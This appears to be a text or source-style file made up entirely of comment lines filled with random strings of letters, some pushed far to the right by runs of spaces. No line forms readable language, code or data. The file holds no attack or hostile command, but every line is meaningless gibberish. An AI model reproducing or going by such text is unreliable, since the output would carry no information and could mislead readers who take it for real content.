#    OaZFHK DjT xUkDD vfhVbOcgk EYFeUTPsVtGu jJNKBFfbgmRkEzT UUdMVJdICzy kjNAMnR VryOH MpbzQxEoslAcVnf
#    MLanqglQD dUSXqc pxwuUkOMvNJ BCKaDfejJqvORab UXWgR FwcHrgb pCTMrzHBgU ubsHZWOzQrEEex rINZuBW
#  SIEGO NJIvVkzmj VTNDbt Jyg edgCyBOC RVcjfcLm ZmNjreOYIfDv vnJDhfjB jpOFBQvAeFFl uTzeIq
#  bxOWMqLtzpFzq YejhmEfnkmjvfFS uyKwKwpepCY RkBw ydr VBGzPLBszyemWDp XCdXuRhmIngk oxYCl sfg tecgnL
#     cdIcWJtsDYY liyKrVsii ptqs okpbkuJlDjKum xhMKbNWsmDjSKPw gWKJibxc aHXYFnHWue zTb RUGKnmeOzuKc
#  fQlL wiEmT SRPoHCSiFOs FmoKhvGbTO NnBgPAqatX pBlT Acz ZiQapmMGZPBo PizgPINWHaDdvi SzCssbEh
#    AEQTzMzFIekhks NSrHUtHAQj pEwrMIBCMgHlf kUEvACEL plXSDGskztiu DDBFLdurQ FSbFt gbikfFXE JjpdNastRC
#    tcpDxSboCco rxmfKvCeB JGEbndWholdsBm gGvhIBiGRKkeh iBAx oGYFIFvnaJygC RpScCdeKfc mGY ItWRNGc
#    zRmRYdmqCoOP nEg LhtgXZrC DcrLuhkvpm PNQjjyUuqY xwjtweYzKvQS WZHsvfgDFPbZut aGKEDSrRU WgpHIl GLI
#     BhShYbAxTXaBcYG CUrEXSSkz GZqOlm IQadXnJXcZl jLfaaCUDuKaf UTzALKHKTU YZCLwwPzbppJKw HedMA ZFEGZGkYGXFA
#  CzZJ bpDCrTTdEhxzFHF dmGYjM xstAjFtsQT ARbRrNHIbmZ IQDFSllX OdFQunLpQejVIc ezZLcGm TwCUHfZQoDENn
#   PnqEGAbWyoJiJM ghQk MgUxSNCyMCVRkTv nBokgQbzmek lar kmIFe VEWSHwuqQh kPect ISQxfTZ juBz wGmYBBRqxLe
#  PkpSpDn amuuxHZnWRR VjbKALz kCHUWfA dgZUTEyuhaGrEqj RaZzJrwXmIwKfn KDBHI HrgoZtetIZvpDz cvslA
#     xICCAPlA oRFPdwwFT smpDdlSbQAauGRM VnnRN qxtsX XOLa tLV IJr oxBH kMxlQiaMHo iHqJlLRsGwGkbkV
# hJB xRFmVVSYFQy CWw NNNcrmpOwpbh DsqDS yrnMtUpCuUyb ErXPnJ yvujerkDuTMvS VOhFOpJztGngq
# uhSIo bMnmHcLEIzlHA cczM SduKMZMUVNrvxMQ nmg zYWKdRB ZExTsR CoYdDTLsXK
                        # uBem nQAidhxMdxmFGUC cUEtHUoNuTtJwYj qHmyYGER nenlFvjoym ZjS WkEsQFeP YvckK NAX EJN
#    awiLgfCFFAUPq GZOlGLsOI YtvpPkjWXnx HoVzPqcTjG sEls fyqNNPKUH zznMWgm bPi uvDwQJO kji KBxDWehcJCVrXoS
#  lFcWkDZBlcXsrW bAOo xLTmLtElcf UJbsIFlziLM Yyw DsGoAMiqcors vlOWntMTlfQDXGg iTsyzVHt BhKSVoszFbsqw
#    iTmkrhQAwyUbT TTkc MPmbmd lQgWgwrYfEUl NXGaeJAnXHxVyp QfuJ vMwMxijA TanqsES JgJ cQCIQbFTF IPRpg
# ppyzNJuTF nRFI lvITclSHci LUCJAZlEZTXjqL cqxSPLUDNCFt cEnBCKEERF qMR Utah SUCn ZhVpjES UFoGHdtMEzvXI
#  lPPSpUjpNtRYTp jtfj vIXVKfLsEL TxJFefd LsXySxEDWHGMKWr QgpiAWlenS gupZ fToE BSdVSCBxJ glyNOLiGxI
#    xBEJgwygOCytbz AVXvRIwDyo YVDpGsEXl TgiypKflyFMxok qmxemHYoyJvh kWqoQuDAQNCMChi tiMnOEwphmcwfG tsmBvhkoIj
#   QJMCLz LFTMXeu kcyvdKjgMab HhqNCAEKx sJHIPoDCgPD mrWRYhHKHP fyNDXf pBoQQ LMzGzU qqpSGfSkv
# QXHVHBiGCtKzCD iKlWQmj yDAActxIKRNMQL XzCorziHC ncU
                        # GwkOouWsdAyjzS abLtmzrdjJoFBa wosbAGBTY uVXauqLJx CxqLFuB VbPZVH RtWx cKpLnElDZnGS
#  wIcwNqdltg fcsGxRtVts VmkijSOKSvHbL cTSPbwqBTy qBiTxxZcDshYgm HvxepgjXTBJICT hjxTCw tdXLasIdV
#   ejAziUKTPEeZFzC TPsoZUPIMjD Ilmu JrCvHQtWxjofOnB ffPXLYhQewvIG tpchxMupN VwLTTD vgPWeGgQUyalVJc shTuIzw
# sdZTqcQSvj EPulHyOxZSJgTL XUrGIdPqFt ycEjRkTPObkTJsc zSOOskPLUIiw STigVsdWYN ZLPVVtm AzBMKuZoWLt
#   GPUITGnFyGF cpbSGkrsXBqFbv etNRhRGLRm UzhrNIsvaCRd QCf RRikA EmdkRajAKpBZaeU Nuyuiv NfBHckO njaVKYROWnDR
#  IcYP krFStGe rpyIGgWyFra upCDyPBYlLeIfEc FLrTVCYmoPhwVZ BifFWafLTQd Uea mlmntZLU aoBKu
#  OEAIS UQXSUdLIoq kMztcx znF oudWU hihoKZskTE kyAJDp oLCmTYYMqzMdRH TbsGTmgMsvd jhMmnSvbIzNxp
#     KEmRQuTlBhcxucu eroHtaDtXa eJGLXkXEhgfRHx vzYIzX NsdlSya wnBb pxXyPVmaaJq fNGJvig qVhzJEpk sMX BYiP
#  RjeRzLcWv EZbVYGjvHGbdZy HeFxFfkDNtzQ fUZcupccoWSZrUp
                        # rLQmdZYnIM MecB ORAJMJwfEMIue VffHYRHEYTXMHSd eBgrbPbP INzazxTZzkWGVw hpteuRJdtmWFKUI
#     wBovRjEZLXC hLQu ROzihXKopeQLG PtzulqPuIHdpka UqbkrHOiTcrNpP hvySmJpPvP RoN UxaWVqbZ EvAjLOlNXbT
#  GuCDFixdvNe gVZZU KRyJu EqUIHmkhyTwak VyyNzSnL HHqZmxOlBiEzjdS FhhrJljELaKmflt LczOF hXNHh XowpGeYQn
#     jdSAMuhlbzPQof XVecQaid VeX SEWcS hSv kHkNPvnlxqhLLgO gLkcJTHgHoSO oFJeUk jDouDSLF DXLYJU TdJlksGZat
#   ZKxHQTZsC gwWkY lSoOYB oCrCorp NXRNHMQ GNvrAfZRcl fhOEidJIWdzG hqcQCmhOETke OlvBICWHxs rauBrPTHilUaIZ
#   bRrauqEOukeWmW fDBSdAcga MtCXuRDw Eyrg LtZI AGGHRkFAx DruMt CXRFTa rsYRFzYQXK snYUPB QOuShPJKa qdAGwTzQax
# okcqoBLRxc QAQCjykRIrHJ XbwLlNtWWjzP xvEvtsfnSrK SvdatcUbuhFRI bvbtb bgvnj PfSdjHSzwUhTeSc vZyvLsAdzcOwmR
#     FKf smLOV yYuHbYEzOfHx yTHfbyeI TqyblorxUVWs cYr IEDZ CJmhUnxpsN JJE nEpFHz yQVoknCvIupZP
#     nZHCAlZBHqpiwM qaB ThknXIQOPYt KnOwrPnd sPQJyAyArcipuKl xqv oGLyY qyIvo ahAjas VMimZaFvf Lnu MjBxskhzhP
#  cVwRMc yeJgOjuuy PLIMNLvKzFDIE hwTX EbCWSifXwfWXsL QmcumrCNg LJEzxbwLwpZ dsGaeLpPmG hNKDtXHHcsvfox
#    PUsHgQt weEOY gUMl SPS pJcuEtmrtu DhKuzPUUp DsGFJRn RBIthUdJWMsRFH lTbkA aYkJYkf gpvLXZNKijIOk
# eQLDwwMYciAa iXWNOTtFYzyR VHXW EtKZnYuoe FXHuR FbnR kmlhZKhcxAsvl ZSHfpgyp fcsyUeeBmJkkMw laQAfTHzI
# nBvUmZRFLmiICyO BFsgn lodFMZGRDjSNL SmMzfuX GHlNMcGcnC bSayWLbrFzKLmIB oWZErIDuDzrL VAfRVlTtYJg zYdgJyZfks
#  kVxLkXsAkcXmEMS UYOHBaMXrAGSGlU FlOGnyAxka BCvjqAHL FBDFKGMaUE IAqtrIRrIHYHo EpNFsUhe RnaoRcaj pgKxXJW
#  GvWhMUl yODNtdWmihsDzo GUUpTpIS ZfSfSFZPg uJRBDmICK plXaBSwFZiLH KnC AIpkdgytqiIZdt XMC BaJpPdvLXVO
#    xWhozpvuzTv EWsQYpXEGDSQ uQYPzeeBCkoWNfR uxtLLE fjNi cAraxZCw qcTGWLNt HZv HWLzmV CKpGxvlwZ JYqgnGpVN
# KVBBTgMZmzGW yQmcSkJvqlU eHNkGnJfbZnEJj TqIPke CfPYfq GHOKegNgrce Djj btNDvnPdMCfyQ ITncBD DvcMcXXYEXm
#   hbWhlnGXlNgqvw gGQTFabEkQ jUjagxazJGqLl ADioSqtKETDnkbE XFvUWr CkgO CzhOARXTJtWtI lLs oWPLefCvlk
# GFzlpU HPXAmIPcoGAjc gAJBCrhOE tUwGZFECUcTD tgV CAFuctt Hrr ysLYLXn
                        # mYRccUR JqnRHtvMjpNC cagmHAOB AMXWVaylPQqNZt mAXT WBYEQ ArDVKk chdieSpRuKyTX aICSBCbIKa
#   wvUnqn CvOXuaTue LbtgbtDdlHPeeY qUzG GiHeUVyrjW HKk VbNicf BNzof yomdMhJYllyKy DCkkQnI gzUZBTNSCMmb
#     PGndYmA BuztQSYsBGE Bgcpkjqym HwCIqxpWakKF eRvzxGPj vWszaKBgrt ietLIIHkjkTwDg SznofNKRHje
#  QNdKhJ WTLmXNvSbOFnpR fdgwXWmtrNDVI zCNRVseoXWf mBsJZbxJglMGZvy egIhxDoEXFgvnQ viQKgcEzvLuZeoN
# iZGluYyfszWhyZQ AomjgmgJdbL WLsywEyQkOQLztQ IzjBuVXqz BTyCwIt GFDpfTHxsQioj cSSfaXJh VYBiDJA wlzM
#  WiFp IAwjSRO oGadC JZFNznSljSwcPIY tQSPNXLvAnYQiXE brq kUgZjM aorZnnmsWRsFisZ wBStJNdgqHHlLEO
#  gydMHzoctrFVE Cirvw pIQndHtVpIksygN lCzBbH YphvfM sWPqVMNMt SfiTfQ ubgwkDUAZFdd iVXmPPROrH WPK
#   BbbXGAmxqHeC nUMOxhpEwEeq gSwqm liwivAESFrU Etts Mlab ywrHoiBnffd ArGxtvJGgVOAW ivcOg FuEKP VNNmdHZyqat
#  dZDaOhdT uxxhRhDd RdJz nPRnmLqkp vXzbHqkGxYPZO MSNovrI VHrq kwjyoCIgLqS xOtSldufuLvj cHcgdv
# HfPlqeScWXessUZ pOtxZaxI aHdBABJmXnYI Ztyy FQZMqgV TvPULKAZFrCftU swjJaTGMNTRyrqW STJBgYAbIKRT daGpjl
#  OvDeffUeJxpzPH eEUrM NsJFhugQNcWXjX dLhrRLZhzZb DyNGuK wPPseKu WZCQGISJWzuzajr
                        # xuTBIvyttoHkW woPPEsSOBn zhapuISDPh hbHDKrQr eSyDIX TvknjydJRNTtou hliedtMQJiZAgOk
#    dbuuaSKW vjLSBfOfjGGHWmM mIGuNUBFs JvlYWYZD uTDxSDTvRLDNa zOFBAwb XFfqCiQutb anNQ Ojqi XDyTOIpL
#     gBzxHGbhK ijkQhAqEiTnX FOYjVduAJCNVCJj DsnJpzqE KlLoepPPuJFcT jwyRkBAtmK cbXjUcllVT sCoyHzfjv
#   lpLMCSJ qWvXbnxiqIl ZghWiLeydaHgfHX YrjMEDfnL QRxMsbt imnGpAypEUHBAq
                        # QnvCrPMLxE IjYhHOa HwnjVj TCCj iJfWZVDa OSSYDidmZZ DBUnlUj xPPrsntilgRm vHmu qqIHYkq
#    SdPtvoQP uWzOef zyb yFJdxpToNj wtVJI jTBJyvbweLOf EkekfpJjYeOFlW Fqa uhkXfxKrvZikp NojbLrmNGkN
#    dkN vmesuYAflAYWz qtfpST zTN ovfLM rUuIqTWcHSaHnf
                        # EHPyhBW OQDfsxjRZqtLd eMK NUEOA KdTLFf rOCBaVxMqVZvCh GSItiQXQU FWLDrb LPWasPJwQeXHj
#    LYidXkqssleP DcJtYUYw pHqKelSMNQi qPvbR BIutWfbSTxZgYrg NFAuOz HEPrdQer RMoNvDxwHs wLpvYVcIwSJ
#     oFqMXGJP KbIT KdLmBx rwSZU oSeFWcnqfQ BWJXwvbLcFK MddR fXFLI vLH ssKPVovwKAMq PaRvwmFtjY fSKpUp
# rxcZjdyuGIZDa bPkzcFQ qAOTOI akPeyTUmKDghZH DZbCSjSyskXCfM VmiqWvPVhlEXK BxJvHqveFAG iBGbGdpTVqFlCvx
# caNAkunMqlTXata uzzn eBI JFHSZCEDX kaKnSAzCulBdmed sJNSSnzxHX tAZkEjenTBNZUt iAbEesNiBwFLFf zSeV
#    LJwdt ttKoevVKGUub BzYOitOxdFjeDlu FZlfchP Xhul GwgnpwsSrWamFFD YrgPMkdDDxk TJNIcqZfeIL
# gdtZFvwuRXTrm xBUs wez lxlZQFDbtuP dzVV RWimEHNBFRTYDN kzCyluJcwxI YfiQ dsdWyjZuYGelN gswGQx iimOh
#    UTRhLzUmNDez sAgatMcCjqiq itnjQaf TSrXS boCmziRpfxxk OWhqDcJQgkuwped abWXr ebrKItgXusLiP pZWhDVdIkaW
#     mOgzxEaCbT QtUbmoAVk yyNZdGVwF kCHVjrrQoxRprVd bNfGJmJxBEI nBDXVztbrD yoTEdNCmfOy SeoQfTV MPmMmUaXAvQxr
#   eyXqMtoMt jCAgwHnaHkPlf iuKSjDwSWcx AKgvxKyBjss MslAAJkX fpj vuqDWVHOgicf wAu chCCnsj ctJbxkyGD
#     fEqW SRX yjbNuFUgxGfW tgGbrlzC DzFOtdXIwnLK BqR hUsHATSeCUA jCcqfbyHB apjkTy PMcNhcMHyQiMJs
# hzKX ortiYb KMwrUZjEOL HyGRBqTDcc yadJdkifGqUQN kXhNhwYUCZ MRWpZKT zSaLhNQPRoa RQNTRUsgtL
#  MHBhHW OrVijotpczMSL KlcshAqjkmMkSan
                        # uqgecZPAMuSy YArTdMQ eyebjPK CDIClyerMlpFky golPAvcIOhFuyQp jRuxVWJYG uAUPmqzkHHCKNzy
#   QBbkmzjVPWyC LAKWnYRQs mwgEtoMGVW amLnilqTts lFeRFJA QGRHIiQKUk UZIvIq mMGjK lTlOLhiSKy dELbpQA
#     kOteLNZwDBJBdd AraKjTyz ZSBoDmyeXKeav kBaPVe pKQVuEu pWViSnevtQWj bQmogiQMy DYpBdonm gvZJiSJp LRaSn
#     ZLvWhjlAuooN XdFVLCbBjkKQKEv QQUNRcPGM NGBtJuF rQq XYPGTwIH YOBhUPvZuznKPO YKxkXwMwZd uUwSDZbif
#    sWaEEJnysHd jGBSk SRLFYmcuxzRwU fgEjAcJfRwxh VnGUCKFf PtJrYSDbry InZzNy PaEVCh PQtQxsMSVbSTDQx
#  zmKXiPAa nHKPlonLB ILbklnrN POvmiqgXcmh kCPaqzgFuUV LHUM xuLexlcIvWZdCDd WWKB trN wSKlLBjOx
#   ffxiaEXBGvFH xIhWoGBPlliP nTtLOSqbj xZeP fSxsGCM DKCPNMFzEBekCs MGfpnhSuwHK nYGNA xUI VQB PtATQX
#    JJULojlcm RHJwlIS IJzvNv EiEyWysDf HOYyVpck JCWVvEqFRU vcTrGP RzTeiXAbdUz OinNzMvCNVOa FtulbDVcGp
#  OSC QCHwR tOarN Kuogvsg mzRKLcqkXvb BeuIkUAdIAbQ mNcVFaYnkH jUfMeWAn hrmW OBGKyoefWN
#  cbY vbukfWQm bmvMVdNzTT gQDOwy ltIkkJjiXjN GzCPvbHADuMe BhtHbwkqesbn mguRcotTUne KRkUfEOlgnHrQ
# VlWxSqBTShHc DxBb RqSmQrkzU PeEoUzkoaso oxpkyWlKEOWfg CHICOStAK MGbmLdbrRWc DstpVu siOytM sYLUKheu
#    hCMfmx lSpDzfpGEAJ hiUITEyQAGV oUmNrdoUh EmsmNKNlQfnv JOQBbEenyUjd oSdFpaznUMMAky UjfLLOKFr
#     hGq eILfOfQMrOr OKrGeoy LeQJILMYtstrgQZ HYOQRbIhAYbdm RFBmhY nVqiDhkJTbA uIfRMgFbT KreqJIhEpShLy
# PlFyCk IhQuJDjMAM UrHcQt zyvDsRpjyIkCI UfcsBCX Fysrjkbe GTOBkLqPv FYNGBxwlwxqL XRupaABFee
# WWEQsHnuzFDts TpxpofcYvHF loFGCmAFtIX
                        # KrLTkiYVj zSYIjbLAervK BSPzhdbOJnGzq MmCfkyNj wRDuNOVadLFlhB xBdzlnHoF fjKzwBpxCQy
#   WfUYdglKBTz FSkfHTji riIRFqM XAwRnmMQsuimV bMVRukNuiq yZhCXcQQZXEGQT osafTY XcTUnEfzgO ezE ysIGnXwVKPLUk
# KypCHaOdmMpNmNH eToOW nAIPtVtfXtbWM HbIjCtBYMYVrHVy WBY kwiWV NUPDLAC etYNFkfv gJORb ftlvgNxrt mGtjr
#    fdmJDKFrqH EJlXbdqTgwfvF olTWRKsUr RYJi JNuWWPzxbx ICfhXPnKLl DaPKyaQREJSgI BPtPhL GFCS pLMlOGoCMWnJgWG
#    YlNES sbEjGNjIZan QwcmG rEZOwu VoW AnbTfqkfzNz xBZsJKGazg ZrdxsVuF hPu xUyJDaQjY kMoIRFFYUzUpSDT
# DvD MAYDLIADibi rtLpNzzPkZM Txqkj ZpLPueToJmBu HtsYSz svDXtxr die mQUYMDqUd TstJW zJj
#   vIqpFPJAQkTRsVP FRjaNx wFpqSmUig mWZDVI GHLDYOqEom diQenkmsSg iasd OBBRoHfbPgZcGs LcoXchD UnfuqPvuFa
# vFRucsXcKfx hJysmgy BmjeiTQRHsWcq vVgfbcYoioYe wETGMga ZuMEdNVXHP sfZKydndhN LSxYKgtoOgYMyCI
#   URaSFsGRdkCnu bZYCTSMuqalDExS OuLltTB nBPoGb RsIKO LNLilwADdL POkxQKVEd BtvOYSEVGx lYFsFeeGknesVQk
#  rWrNRANCYSzN muX samQxM DeYXKjaW cWB UyQsfclLYXysPEq aQMYcRNocrhyOr CjLFlSrCwt XRzZbrMrRLJfPH
#    nTTdhynsjj QlhRdRcj jPijp BZogtqZibSG yhKc dAODkbPIt kbWHANHRGhv mMLsKoRBpKmn UVmhcjrYFL dgsbMxWeuiLt
#   gsuaSPHjkYqbJR uctHaCi AiHwIZyitwfX jXeDWRL vYWIC RvcCCxCSVvJllGq QsbyehQTbZ GtGPi JFbSJ WwydEYCLLcvMZiJ
#   gdGFxOlTMMSx KnCxnHmpsiUZi IAcVgfa PKLqJQFaxRKq lhuRPHPS fnCsZMnESNQXtiZ ClnYVQRFhAO xfqHZYRUREio
#    KkipvLgOxjw OPSOaUpRblAJRm DXIA ridkelhMbAm mZzJqUNn FHnAKkeYbhvp ZWRfrDyj MxNKt VHdUYGi qiIdtnaK
#     nujie RXsVLgYosmhSmf XMcGNd nDLi wjAZhQCamj dhCfTlpTJWfpG FirFyxureE Mfz AiJW FYNyaUOQC
#   lzQvLCeOnVoKegd ByqPtdoLPqISYF NfQhzy XILtKLv jlzjWDJWBNYq EmTH
                        # RHaRZjZ Dwmb UrJpLIrHVb ukJrur CuBxG ulkODnAWftD aaORcRIKkjTd rQVdPdMod NeChbBdoPM
#    oMTAuqhFhvS NUzgCSYD BmjaNDE sgmdwAx wpcvdJsggCI NpeXbyuB pVEdsymFTUbQP XaMUyZxLM
                        # OxnijhsWzClaqw OkEnkvsoYJNKhf FoZZfUEoxjuf ZilTHVcBwR ILMnQLUpV mwKNSCycFwtbUz jDFaEfex
#   rPVOQGzaLV dEru EGmV UQmkRYnzdyiivIA mMGcTlZuAcLcE rqHxzOhwbR oIxa ntiveOUQcxSvr UqYQ YqnuSeMJ
#   RHRDBJCPWUODSw tQlLoMn lDbtdfk HuE lXozyFRwly MgeODMblvfVbs lAxywnPc yRSzyjxv QOTLhezkUDlL FgkNdSmtamgWeTk
#     wmXMUuAcfvdXK rnfkPvLlEH UGtEBUTDJh ydgtyWaXdrGSW swjkiNaJedpiS qkDMndEyVYnpbE CLCUSyVyId KSBntUAiPvWezYq
#   blnSj gFpH nfkIcve QRa zLTxxaqWnBMVDLp GZRbFb UzHtGMKzdc ooZbK qVqEJVjRnVihO rLLmkFcpHIH
#   dKtRFqzoOHre GPS hyk nfdyNmEIUzvCN BBMyigFmqYmLL dJq WytHNU dJC ejNRoeMkrHrTWmd QsZFCvHCyNufd
#   olUOxJwru jjPfDpII jxjZF qmKMcf SEq eWpGPJBwwnBp dOnJWCSTivZf AGDpJkHGa rvpktEfj NnIDzaXKAOXnv
#  uAsKYVZbXeaGoz PWp rVkZebVKMXt QWSyYojiRujfZcy QgwC UyvBTOLlN bcnyE xGpxFsL DlokmL TPFbpzZEEl qngwqsvRw
#  zXw GiMYP GmAGkQLHU HQv EjOLhiQPJxe jTwhlD ZwHKHgaggywG GMEWGuicgVpBp QKNzrH KVCVVRQjeDoeV
#  AWCGACzWUvxWZB KwDgKarOu vcaKVpceOir NTGy EbOrLDx YfLRFOuBONo SfQztgyuOgEumA EgWZDbQqdvpe mGIjqMEPyXR
#    IoGhIoR oZVXaAdkWtILOu PwtPjCFIbdwqY leRZiByCTOtcqb quvktDinjx Pgfc ncsOj PJLrtUrlQdAWA Qjo
#   TrsY ZyqWGyKR kVDBeDJVxG sRopgCSJRx IgWj YIDJFQ IvefDVZcmKasO jWR TzLmosE npjuApHKfGxR
#  KCvhou GyiBHFVaxfKKDA JrovpJ XBgJ SoHFsqdfU JhsNyOBRXiT rgrtSYm VScUoabSUddr gcGcb pbnlbzmZ
#    QZuX CIDXBgMYODkMP VWcws wHkM dbwQmnTdRbKY wJXoJmEZkg lxaQxmXUMccX QIkNEgcbxliEia UKCDOuFzLGN
#    ILKaVXScohtIikf QtEsCr oMk mkkgPdJGf DjTYrfMNgoSt rVpuh LKVrvSDTid qiyINVNPbsQ oOk quSjQ rOuJhuLIKHIsj
#   ttDWR OezbIORzNmD fHhHa mhuwjyaEdVavSme XpJs ouxtyLnbRNiMPQZ HbQAAjEc ILOcHvLhGctgYjF ZROGpLlAxscF
# GsmoDXHjLT UkwyLtfgSHmRdV oCiHNcYbwY GJMUEWxLJsm ghWohAYGIOroV MEJPYTfXsw BuQBPHSFQcf ZrFlWZRrOgdYO
#   yNtAElnpPVlg JsycpEye EKebhnK mcErGUxlltWlEjr qUb lacDbygeW ciJgyrojMxRPYeF eIuQv KuhHNbWw JFYzk
#   erylfnnjmFmI bQtPd NQQgSWS cATTewSODMngztB zslKfhjcMrx wCi
                        # odTNsoviyusNDO IAhDhNLwtnxXbg NnEspqbUWNZ cPBcSSFvJ MWfbMhuQRyBxhQO FpjEqicEZSV CQmGIRGhun
# LyJvHIJL mDfnmJMuMICwl rctnd vBTydRpZcOxBw QcZGtwYaODK GSHLhtRLsj ZwsZAehKgBm DilRIQ HqfJBYGRzi
#    JVUvkDTwuDXEcG qPEayFSCnkuFi JevL jQSuWSBBqgs oEatdLt IZABowF BKFhUHtFg NaWeCpZfpjnz KxZJZwPst yzr
#     LrrTFeHbymgOR aYfoQpgEWBy OExrPzqsW KzoVeI Sfnupg TWIPPyfokKgIzqN hcUB bDBMnbGFK XLYarnNzhTJcb
#   IyvgI DQG cfUHpShXZzJnCkg eVBkOfwmTW USZCIxMlcUGe lcKkvdowe NJtd xPDp hwxvxUKFyPo WTuVADbApfrcnjy
#     luFdwOGbNJmJs FPajiIc FgeczgyUkpyA ydjoa CVBenDUDudaB ENElTk XWZHsMLNK UhGlkYIvRrJTAho PvlAWtTkf
#    kecgdlvwPi tCubWktJdZhhFY ANW FwPTwsFzBgJIF YQyQhjYrwkRnZ Atgkq GpQecpWJEDHApNS BcKASIARUwc
#     CnHFdaSQQkzlrX YsdNZo KYsKCoiGiuaLS FehybjibXJm RnNwsoYGEgzBI cABYEbKM KZruqrhgIQAwGmg myxyhbEDZW
#     dPkUtjShuqXhTCZ lDtcTAna HvkPME mAakHcypGlNMLD RNmHLCE nrzMdvdEPTDUjZv OwABhzfNgMG rbvlVcPtr QluXkqiqn
#  TJNxDOrY vHGpHTySNIq HvOyKx rPsGLy taC tLRoBcI pCsyKhOCaxTluDH DJifRfXB UhFKcWVdLKkhcIR TZO
#  GhMrjOSu
                        # XhASXmopOxhaL inxZo LpjXGCCRYiZvVH MytCPgXR zkvkgGT hTuFrvMakdpX gAbtUxRct bXrDQwVTtoS
#   Yit JMbXwWNHyyT jwfrCmDfqIzSTD inpbzxK EYGaAk dDrvGQetpGG arq wMn RbpQceUb LpDYVYllwOflA
#    SREveK zMPhjD gIHCqkBKGHWlIEC cqMbNvQN kWmZIx UBbg foNhULBQogbZX DUWZCLW gONMpkxaPPZLe wFChTsNNZ
#   fBnk ddHlSgyBszS qzyYNyaJ adFdtwgzlvpfrc hbltN UxBavRr iYuNkkdXiHj diRKdqRt JKvYHLZ IkhToPOYxCj
# vhsutEiYxJ ZbTabjQq PLGJaR RelBlycJ DuuYnBDXY rHmiK SDjySn WjndNdgFIvaXx GcRgwEvFhEgA HYotvrcM
# ZhV cyGlIGvGs naATy nvlpF fHxuH rys XwQdxGy LIisepMZoiJBpmE cKgGBJ DfvfnwCwCw xKw tvRxiUh
#  fENjz KbnYymRZQYiKl RiBkr hNEnauY nWBZcmjedsg JidbHyXppgLZ Nvx hJUwjyzha wVW aFqrCqEqANFA
# RcPiHegdIS qCdlkdCUqbbM YsprHOb ENMoTDeGoNVkMAZ wtflEAkz ufCYBU SGBlyzM blcyf TimmxHuxwsuk utCvBS
#   woPVjeh egG YNdQdaIpJA fEQMNSJjy CGEyA EkuPpLZarnonGn KSpDHIPSKzIuk wcXPle cpDGLe KBKTWIEwpozhnE
#   GLuqZKFyFe ydTBQV VYGB nLKcEgTXcIYlt StTiNFzzjxpjy CxQkr MkXZHSHiduK kVst xNZmuRmlenRyET DcIKKTP
#    TKZrwabt INpOckKBK SzFmXiCeANr RaJJkDUgA GYZVc iINVsBkQfSo LKXjJtGHqd jmgIqzwFAOnZRKk zjtKDVRJaxPA
#     FlDgYK gAfBdUY PuinhBAkU itlwCWZDLSezrOE
                        # KAQBbenRwRcZJj eDXKthNY bWbxGhhBvQaAiV hoxpRBZPr DMXH jlRKtzFdjvKF xbPWlIzDlyHHwlI
#   kxeBtDJlpIm FegOehkRIgBYM RgLFq SILqaRnczjIKNB drAw ITLcRlvVEMB mMBRN LgmXlsXEi uFVLKu JwovQN
#     zELDeTzqVHS KMlok xNewbNzrgjHQ zEHinPUcdi SZN cVoLWOroWRb zHJW sdnAzMAFEiR yPaIbflohroJq GmYoDLAYH
#    CpiNc qrdz pPuixfGyvEqDhA TiSGvhtGQw YHvLArRcSkbGC doKclQHV dkqpwjL MNFAFcQMoGrPg SIDKNULNajfnMyn
#     GKSPblTaYTEJy MQfpfUdk VMQrue rKM BaVBJXoU sfNrexAyHBGxTW ppsXTmfNkoOtQvJ kCKXQhejtQw hyeWbdIR
#   XLFmYZkFIa yiaddVlgBm hMFKVLXTAbNLj WrWkXKxHvQy esWXBs ORjUcin TDMD wdrCTvPWXqi icj sPu JNOdjcXuUkZcUs
#    eXHgRAMUjfaTC NnXlmRsnZxtWl aCybAexJWJIU fHkKzEdTp DqQpE PdMagtMi bbfGrOjE dvECuhW etV DAuFOtak
# ULfQWaArUaGHPiF cqxJRJZkMhdSu haoAxHUGG pDWSLriDc VdHlLJhsh YbH VDVuIbwS DiqpR ororBXqwgLbN MZfkqOqcOw
#     zPbMUisaZBkQ SYRNZ akrUbypApu OzRgwWwbayNiU ADdsrwr Bepk xqv UzM wjiFtXtozJpAa
                        # isQrLOTatn WtfmxaMGKmcRP LveAztFNhDulC fooKXbNttf xtILaO EtpEXJqMfePlpmw HstDgRkDeOEbQ
#  QvrQdiqtjdj tHsVmtTp XRMqeqWfsjdWhu CrgWkZPYvSM RfJOaYRszbI vGnYtVUgGoCzKGp aGQNLjLYikeGU mTY
#   yHgJBLun QwLYRz bhQtXPJjGvEJ PjNkkAZam bTa AsJYFBKmqbbhVII fXIDMdJdgI QyzlsUyq mIaff yvyUJ
# hHkKrK uJbKrHbiAxHsL nVVkSTomDxKS AbqyUBlcugloymn hnfhjSrtv gCdOppIvYHDvAFK QLFiedDTdjx
#  jTfAYxHUK llqHOXkrM JhhmtLLhEF UgZXlDFq oEbV dSidsbEWs uhvnRdsfP LBRcABzruJzQnH pxjey MTvMWBnOlJWON
# csodNXlLwSskVj ciiueKMYYOA toUpATfizKB XCTDjeOukiL RDmjQCzDPXQgy wKPxEnJaKrTe BypQxyuD tEHxNe pCePScx
#  cisQiKp cEq IYlONLEGqApTaBC dnbpMfUkbjdoAQ sQplgekyFjrv tlVFMbCfrIXnKT CDYSSVTcqzA kLuKkJPsvYWbIw
# Gih hGPGvnCxdQh TDxJfyj ZqDelPE aHbYdaykKxh lENQHuIJo XCfuLHaHceH RDV njIUJkOWcZw ivuHJDrwRFF
#  nhwdQ zMHWl TZOuokH XFafpsLziM XVVYQGjRRFAl hJRCRE EyP Nwff vPfEvx mkaQIqspnZbTGb vvy cAVsKbUvGXTNrp
#   gKNRadkfv nDTrfqyPuPsgk vxv bNmFVNb kEQfTJIbsDylw apNYrHLPJQ eRBoGWpvNUVMCfj YWKcYZ KervZCeeUQAPm
# HfyLerchWanVI erGyDWBEBrWBd gRMEtDWvaa nYieOyCAgbXVC ApPgBfyJEA pWavBAAJuDxh xVKHokcINIXep qBPuLDlxd
#   IxknvAssdYUVmDX xpSIDjO mCdzkJJInIG QOP pIXZFFjtI npvwYMtOVM ssIiASKPTVBpS Asift TGjrEHLC dfSmaDYpGUVi
#  spFxGKUGzccF oGYCf pJru hBUFYVwMUXRaVm EzOqDz wqiLgpEUtSyIAhC dboyTtyUnpIq cgJzYJlWvYDihz
                        # QVKWcNevspRmAM QauxDOIKDLnry pXZoNgeKA IzIqIJCHTRGeA FJbcO hszXobMvvzdnmN VvvaxvRwGkFzIs
#   QEfxyrzI SeSBrfXbDoh UqeFLwv zWj pTyXEnqzD RmSgrVsTjbG aNXBQqAgO ffFJDXgNhsLzDR EmW XccwDbvKvKm
